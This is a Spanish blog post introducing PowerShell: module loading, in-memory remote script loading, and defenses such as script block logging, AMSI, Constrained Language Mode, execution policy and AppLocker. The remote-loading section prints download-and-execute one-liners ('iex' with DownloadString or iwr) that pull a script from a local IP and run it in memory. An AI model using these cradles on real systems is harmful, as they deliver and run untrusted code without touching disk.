---
layout: single
title: Powershell 101
date: 2025-02-28
classes: wide
header:
  teaser: /assets/images/powershell101/1530645393770.png
categories:
  - Security
tags:
  - Research
---

# PowerShell 101

PowerShell es más que una línea de comandos. Es una herramienta escrita con el framewordk .NET  esencial para administradores de sistemas, analistas de seguridad y desarrolladores. En este blog vamos a explorar su estructura y su seguridad, desde la gestión de módulos hasta sus políticas de ejecución y mecanismos de defensa.

# Importar Módulos y Scripting

Uno de los aspectos más importantes y de mayor uso en PowerShell es la capacidad para extenderse mediante módulos. Los módulos contienen funciones que facilitan la automatización de tareas. Podemos importar módulos en nuestra sesión usando diferentes maneras:

1. Usando Dot Sourcing:

Dot Sourcing permite cargar y ejecutar un script de PowerShell en la sesión actual, por lo que todas las funciones y variables dentro del script estarán disponibles para un uso futuro. 

```powershell
. .\ScriptPowerShell.ps1
```

1. Usando Import-Module:
    
    Import-Module se usa para cargar no solo scripts, sino funciones, clases y cmdlets. Esto permite que los comandos dentro del modulo estén disponibles en la sesión.
    
    ```powershell
    Import-Module ScriptPowershell.ps1
    ```
    

## Cargar módulos de forma remota

Una funcionalidad importante de PowerShell es la carga de módulos remotos. Esta técnica permite la descarga de scripts directamente en memoria y ejecutarlo sin necesidad de almacenarlo en disco.

1. Usando Net.WebClient

Este método usa la clase .NET Net.WebClient para descargar un script de Powershell y ejecutarlo en memoria inmediatamente. 

```powershell
iex (New-Object Net.WebClient).DownloadString('https://192.168.1.12:8080/resource.ps1')
```

Vamos a explicar el comando:

- IEX: Hace referencia a Invoke-Expression. Esto ejecuta el string como código de PowerShell.
- New-Object WebClient: Crea una instancia de la clase WebClient y llama al método DownloadString para descargar el contenido de la URL.
- En resumen, carga en memoria el contenido de la URL y ejecuta el script descargado.

1. Usando IWR

Este método usa el cmdlet IWR para descargar y ejecutar el script. 

```powershell
iex (iwr http://192.168.1.12:8080/resource.ps1)
```

Es similar al anterior, solo que esta vez se usa IWR, que hace referencia a Invoke Web Request, un cmdlet de powershell usado para enviar solicitudes HTTP/HTTPS.

# Seguridad en PowerShell

Desde 2016, Microsoft ha fortalecido PowerShell con características avanzadas de seguridad y registro para mejorar la visibilidad de su uso y detectar actividades sospechosas.

## Registro Global de Transcripciones

PowerShell puede registrar toda la actividad de la sesión, incluso si se intenta evadir la ejecución mediante código sin gestionar.

- **Objetivo:** Registrar cada comando y su salida en archivos de texto, brindando mayor visibilidad y dificultando la evasión por parte de atacantes.
- **Ejemplo de activación:**
    
    ```
    Start-Transcript -Path "C:\Logs\session.log"
    ```
    

## Script Block Logging

Desde PowerShell 5, se introdujo el registro de bloques de script, lo que permite almacenar información detallada sobre el código ejecutado.

- **Eventos generados:** 4103 y 4104 en el Visor de Eventos.
- **Propósito:** Capturar el contenido de scripts ejecutados, incluyendo código ofuscado.
- **Habilitar Script Block Logging:**
    
    ```
    Set-ItemProperty -Path "HKLM:\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging" -Name "EnableScriptBlockLogging" -Value 1
    ```
    

## AMSI (Antimalware Scan Interface)

AMSI analiza el código de PowerShell antes de su ejecución, enviándolo a soluciones de seguridad como Windows Defender.

- **Funcionamiento:**
    - Examina los scripts y compara su contenido con firmas de malware.
    - Si detecta amenazas, bloquea la ejecución antes de que se ejecute el código.
- **Verificando si AMSI está activo:**
    
    ```
    [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils')
    ```
    

## Constrained Language Mode (CLM)

PowerShell soporta diferentes modos de ejecución que restringen las operaciones permitidas:

- **No Language:** Solo comandos esenciales permitidos (usado en JEA - Just Enough Administration).
- **Constrained Language:** Limita la ejecución a módulos firmados y confiables.
- **Restricted Language:** Solo permite comandos básicos administrativos.
- **Full Language:** Habilita todas las funciones sin restricciones (modo predeterminado).

CLM se puede reforzar mediante **AppLocker** o **WDAC (Windows Defender Application Control)** para bloquear scripts no firmados.

## Execution Policy: Control de Ejecución de Scripts

PowerShell utiliza políticas de ejecución para restringir la ejecución de scripts maliciosos, aunque **no es un mecanismo de seguridad en sí mismo**, sino una medida para evitar ejecuciones accidentales.

### Políticas más comunes:

- **Restricted:** No permite ejecución de scripts.
- **RemoteSigned:** Requiere firma digital para scripts descargados.
- **Unrestricted:** Permite todos los scripts, pero muestra advertencias sobre scripts de internet.

**Cambiar la política de ejecución:**

```
Set-ExecutionPolicy RemoteSigned -Scope CurrentUser
```

# AppLocker: Reforzando la Seguridad de PowerShell

AppLocker permite definir reglas que restringen la ejecución de scripts y aplicaciones en entornos empresariales.

## Configuración de reglas para PowerShell

1. Abrir **gpedit.msc**
2. Navegar a **Configuración del equipo -> Directivas de seguridad -> Políticas de restricción de software -> AppLocker**
3. Configurar reglas para bloquear o permitir scripts (`.ps1`).

Ejemplo de regla en PowerShell para permitir solo scripts firmados:

```
Set-AppLockerPolicy -XmlPolicy (Get-Content "C:\Policy.xml" -Raw)
```

Esto refuerza la seguridad en entornos donde la ejecución de scripts debe estar estrictamente controlada.

# Bibliografía

[https://medium.com/@dineshkumaar478/the-road-to-crtp-cert-part-3-c0a591848b90](https://medium.com/@dineshkumaar478/the-road-to-crtp-cert-part-3-c0a591848b90)

[https://learn.microsoft.com/es-es/windows/win32/amsi/how-amsi-helps](https://learn.microsoft.com/es-es/windows/win32/amsi/how-amsi-helps)

[https://devblogs.microsoft.com/powershell/powershell-constrained-language-mode/](https://devblogs.microsoft.com/powershell/powershell-constrained-language-mode/)

[https://viperone.gitbook.io/pentest-everything/everything/powershell/constrained-language-mode](https://viperone.gitbook.io/pentest-everything/everything/powershell/constrained-language-mode)

[https://learn.microsoft.com/es-es/windows/security/application-security/application-control/app-control-for-business/applocker/applocker-overview](https://learn.microsoft.com/es-es/windows/security/application-security/application-control/app-control-for-business/applocker/applocker-overview)